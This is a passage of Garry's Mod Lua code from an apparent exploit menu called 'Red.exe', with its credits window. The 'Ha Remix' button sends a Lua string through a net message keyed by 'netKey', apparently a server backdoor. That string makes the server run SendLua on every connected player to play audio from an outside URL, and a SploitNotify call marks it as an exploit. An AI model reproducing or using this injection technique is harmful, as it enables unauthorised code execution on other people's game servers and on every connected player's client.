Macro:SetText( "Ha Remix" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "RedBoxing DOMINE" )
net.Start(netKey)
SploitNotify("Song Jouer")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'https://supronrp.fr/secret/SoundBox/Ahremixmdrrcdrolelol.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
net.WriteBit (1)
net.SendToServer()
end
end

function Credits()

    local frameCredits = vgui.Create("DFrame")
    frameCredits:SetSize(1050, 700)
    frameCredits:SetPos( ScrW() - 1, -1 )
	frameCredits:ShowCloseButton(false)
	frameCredits:SetTitle("")
    frameCredits:MakePopup()
    frameCredits.Paint = function(panel, w, h)
    local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, frameCredits:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.DrawText( "Red.exe Credits", "DermaLarge", 425, 15, Color(hsv.r, hsv.g, hsv.b) )
    draw.DrawText( "Mathis:             Sondbox", "DermaLarge", 325, 100, Color(hsv.r, hsv.g, hsv.b) )
    draw.DrawText( "RedBoxing:          Developpement du menu, drm", "DermaLarge", 325, 150, Color(hsv.r, hsv.g, hsv.b) )
    end
    frameCredits:MoveTo( ScrW() - 1400, 200, .2, 1, -1, function()
end);

  local closeButtonCredits = vgui.Create("DButton",frameCredits)
  closeButtonCredits:SetPos(frameCredits:GetWide() - 20,4)
  closeButtonCredits:SetSize(16,16)
  closeButtonCredits:SetText('')
        closeButtonCredits.DoClick = function()
            frameCredits:Remove()
        end
        closeButtonCredits.Paint = function(i,w,h)
            draw.RoundedBox(0,0,0,w,h,Color(20, 20, 20,3))
            draw.DrawText( "✕", "APG_sideBar_font",0, -2, Color( 189, 189, 189), 3 )
        end

end

concommand.Add("Red.exe", Menu)
concommand.Add("Red-credits.exe", Credits)